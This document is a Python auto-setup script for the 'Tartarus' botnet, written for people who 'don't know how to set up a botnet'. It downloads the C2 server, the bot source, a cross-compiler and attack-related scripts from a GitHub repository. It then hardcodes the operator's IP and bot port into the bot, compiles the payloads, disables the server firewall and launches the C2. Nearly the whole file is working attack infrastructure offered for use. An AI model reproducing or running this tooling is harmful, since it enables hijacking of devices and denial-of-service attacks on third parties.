# Edited by: Vexvain
import subprocess, time

def Tartarus(cmd):
    subprocess.call(cmd, shell=True)
def Vexvain(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

# This is for those that don't know how to set up a botnet, smh
#///////////////////////
# Colors
red = "\x1b[31m"
blue = "\x1b[34m"
cyan = "\x1b[36m"
magenta = "\x1b[35m"
yellow = "\x1b[33m"
green = "\x1b[32m"
white = "\x1b[37m"
lightred = "\x1b[91m"
lightgreen = "\x1b[92m"
lightyellow = "\x1b[93m"
lightblue = "\x1b[94m"
lightmagenta = "\x1b[95m"
#///////////////////////
# File Paths
IPHM = "scripts/"
#///////////////////////
print(""+ white +"Credits:")
time.sleep(1)
print(""+ white +"ADMIN:"+ lightred +"Vexvain")
time.sleep(1)
print(""+ white +"Tartarus  Developer: "+ lightred +"Vexvain")
time.sleep(1)
print(""+ white +"IPLookup Api: "+ lightred +"N/A")
time.sleep(1)
print(""+ white +"Domain Resolver: "+ lightred +"Snickers")
time.sleep(1)
print(""+ white +"Installing Needed "+ lightred +"Dependencies "+ white +"And "+ lightred +"Packages "+ white +"before setting up..")
time.sleep(2)
#///////////////////////
# Dependency Installation
Tartarus("yum update -y")
Tartarus("yum install python-paramiko gcc screen nano wget httpd iptables perl php php-pear -y")
Tartarus("yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y")
Tartarus("yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y")
Tartarus("yum install epel-release -y")
Tartarus("yum install gengetopt -y")
Tartarus("yum install bzip2 -y")
Tartarus("yum install lbzip2 -y")
Tartarus("clear")
#///////////////////////
print(""+ lightred +"Finished!")
time.sleep(2)
#///////////////////////
# Server ULIMIT Setup
print("Setting Server ULIMIT and Downloading All files.")
Tartarus("ulimit -n 999999")
print(""+ lightred +"Finished!")
time.sleep(2)
Tartarus("clear")
#///////////////////////
print(""+ white +"'m going to collect a few things from you..")
time.sleep(2)
# User input (We are using this to replace said information inside of the Bot, C2Base)
username = raw_input(""+ white +"Enter desired Username:"+ lightred +" ")
password = raw_input(""+ white +"Enter desired Password:"+ lightred +" ")
print(""+ white +"Setting up User: "+ lightred +"["+ white +""+ username +""+ lightred +"] "+ white +"With "+ lightgreen +"Administrator "+ white +"Account!")
Tartarus("echo "+ username +" "+ password +" admin >> tartarus.txt")
IP = raw_input(""+ white +"Enter your Servers IP:"+ lightred +" ")
bport = raw_input(""+ white +"Enter your desired bot port:"+ lightred +" ")
threads = raw_input(""+ white +"Enter desired threads to screen on:"+ lightred +" ")
cport = raw_input(""+ white +"Enter your desired connection port:"+ lightred +" ")
#///////////////////////
print("Let's set up our directories")
print(""+ white +"Creating Directory: "+ lightred +"["+ white +"/"+ lightred +"root"+ white +"/"+ lightred +"logs"+ white +"/"+ lightred +"]")
time.sleep(1)
print(""+ white +"Creating Directory: "+ lightred +"["+ white +"/"+ lightred +"root"+ white +"/"+ lightred +"scripts"+ white +"/"+ lightred +"]")
time.sleep(1)
print(""+ white +"Creating Directory: "+ lightred +"["+ white +"/"+ lightred +"root"+ white +"/"+ lightred +"amp"+ white +"/"+ lightred +"]")
Tartarus("mkdir logs amp scripts")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Let's download everything")
print(""+ white +"Downloading "+ lightred +"Tartarus Alpha..")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/c2.c -O c2.c")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"Tartarus Bot")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Autosetup/bot.c -O bot.c")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"Tartarus Cross-Compiler")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/Tartarus.py -O Tartarus.py")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"Resolver Header")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/resolver.h -O resolver.h")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"IPHM Scanner Process Killer")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Scanner_Process_Killerv2.py -O IPHM_Scanner_Process_Killerv2.py")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"IPHM Attack process killer")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Attack_Process_Killerv2.py -O IPHM_Attack_Process_Killerv2.py")
time.sleep(2)
print(""+ lightred +"Finished!")
print(""+ white +"Downloading "+ lightred +"IPLookup API")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/iplookup.php -O iplookup.php")
time.sleep(2)
print(""+ lightred +"Finished!")
time.sleep(2)
Tartarus("clear")
print(""+ white +"Let's replace the needed information inside of the "+ lightred +"Bot")
print(""+ white +"Replacing "+ lightred +"IP "+ white +"And "+ lightred +"Bot Port inside of the Bot")
Vexvain('bot.c', 182, 'unsigned char *Tartarus[] = {"'+ IP +':'+ bport+'"}; // <ServerIP>:<BotPort>\n')
time.sleep(2)
print(""+ lightred +"Finished!")
time.sleep(2)
Tartarus("clear")
print(""+ white +"Now let's compile our C2 and BOT")
comp = raw_input("Would you like to remove the raw .c file for the c2 after compiling? (y/n):")

if comp == "y" or "Y":
    Tartarus("gcc -o c2 c2.c -pthread")
    Tartarus("rm -rf c2.c")
elif comp == "n" or "N":
    Tartarus("gcc -o c2 c2.c -pthread")

print(""+ white +"Finished Compiling "+ lightred +"C2, "+ white +"time to compile our "+ lightred +"bot"+ white +"!")
time.sleep(2)
Tartarus("python Tartarus.py bot.c "+ IP +"")
print("Make sure to copy your payload, im giving you 10 seconds "+ lightred +"<3")
time.sleep(10)
Tartarus("clear")
print(""+ white +"Now that our directories are setup and our bots compiled, lets go ahead and move our files")
print(""+ white +"Now lets move our needed files into the correct directories")
time.sleep(2)
print(""+ white +"Moving Script: "+ lightred +"["+ white +"IPHM_Attack_Process_Killerv2.py"+ lightred +"] "+ white +"To Directory: "+ lightred +"["+white +"/"+ lightred +"root"+ white +"/"+ lightred +"scripts"+ white +"/"+ lightred +"]")
time.sleep(1)
print(""+ white +"Moving Script: "+ lightred +"["+ white +"IPHM_Scanner_Process_Killerv2.py"+ lightred +"] "+ white +"To Directory: "+ lightred +"["+white +"/"+ lightred +"root"+ white +"/"+ lightred +"scripts"+ white +"/"+ lightred +"]")
time.sleep(1)
print(""+ white +"Moving Script: "+ lightred +"["+ white +"iplookup.php"+ lightred +"] "+ white +"To Directory: "+ lightred +"["+ white +"/"+ lightred +"var"+ white +"/"+ lightred +"www"+ white +"/"+ lightred +"html"+ white +"/"+ lightred +"]")
Tartarus("mv IPHM_Attack_Process_Killerv2.py "+ IPHM +"")
Tartarus("mv IPHM_Scanner_Process_Killerv2.py "+ IPHM +"")
Tartarus("mv iplookup.php /var/www/html/")
time.sleep(2)
print(""+ lightred +"Finished!")
cleanup = raw_input("Would you like to clean the server and get rid of all extra files? (y/n): ")

if cleanup == "y" or "Y":
    Tartarus("rm -rf Tartarus.py")
    Tartarus("mkdir Cross-Compilers")
    Tartarus("mv cross-compiler-* Cross-Compilers/")
    print(""+ lightred +"Continuing!")
elif cleanup == "n" or "N":
    print(""+ lightred +"Continuing!")

chatroom = raw_input(""+ white +"Would you like to install the Tartarus chatroom? (y/n): ")

if chatroom == "y" or "Y":
    print("Making Directory For chatroom: [/root/chat/]")
    Tartarus("mkdir chatroom")
    time.sleep(2)
    chatport = raw_input("What port would you like to setup the chatroom on?: ")
    time.sleep(1)
    Tartarus("clear")
    print("Compiling Chat Source")
    time.sleep(2)
    Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/chatroom/chat.c -O chat.c")
    Tartarus("gcc -o chat chat.c -pthread && rm -rf chat.c")
    time.sleep(2)
    print(""+ lightred +"Finished!")
    print(""+ white +"Moving Chat Source to: "+ lightred +"["+ white +"/"+lightred +"root"+ white +"/"+ lightred +"chatroom"+ white +"/"+ lightred +"]")
    Tartarus("mv chat chatroom/")
    time.sleep(1)
    print(""+ lightred +"Finished!")
    print(""+ white +"Creating "+ lightred +"Admin Account "+ white +"on chat with user information for c2 - Username: "+ lightred +"["+ white +""+ username +""+ lightred +"]")
    Tartarus("cd chatroom/ && echo "+ username +" "+ password +" admin >> chat.txt")
    Tartarus("cd")
    print(""+ white +"Now Setting chat up on Port: :"+ lightred +"["+ white +""+ chatport +""+ lightred +"]")
    time.sleep(1)
    print(""+ lightred +"Finished!")
    Tartarus("clear")
    Tartarus("cd chatroom/ && screen -dm ./chat 3981 1 "+ chatport +"")
    Tartarus("cd")
    print(""+ white +"IP: "+ lightred +"["+ white +""+ IP +""+ lightred +"] "+ white +"Port: "+ lightred +"["+ white +""+ chatport +""+ lightred +"] "+ white +"Type: "+ lightred +"["+ white +"Raw"+ lightred +"]")
    time.sleep(2)
    Tartarus("clear")
elif chatroom == "n" or "N":
    print("Continuing!")

print("Disabling Firewalld And IPTables..")
Tartarus("service iptables stop")
Tartarus("service firewalld stop")
time.sleep(1)
print(""+ lightred +"Finished!")
print("Resetting HTTPD")
Tartarus("service httpd restart")
time.sleep(1)
print(""+ lightred +"Finished!")
time.sleep(1)
Tartarus('clear')
print(""+ white +"Now we're done! lets screen and connect.")
time.sleep(1)
Tartarus("screen -dm ./c2 "+ bport +" "+ threads +" "+ cport +"")
print(""+ white +"Its up! Information below!")
print(""+ white +"IP: "+ lightred +"["+ white +""+ IP +""+ lightred +"]\r\n"+ white +"Port: "+ lightred +"["+ white +""+ cport +""+ lightred +"]\r\n"+ white +"Type: "+ lightred +"["+ white +"Raw"+ lightred +"]\r\n"+ white +"BotPort: "+ lightred +"["+ white +""+ bport +""+ lightred +"]\r\n"+ white +"Threads: "+ lightred +"["+ white +""+threads+""+ lightred +"]")
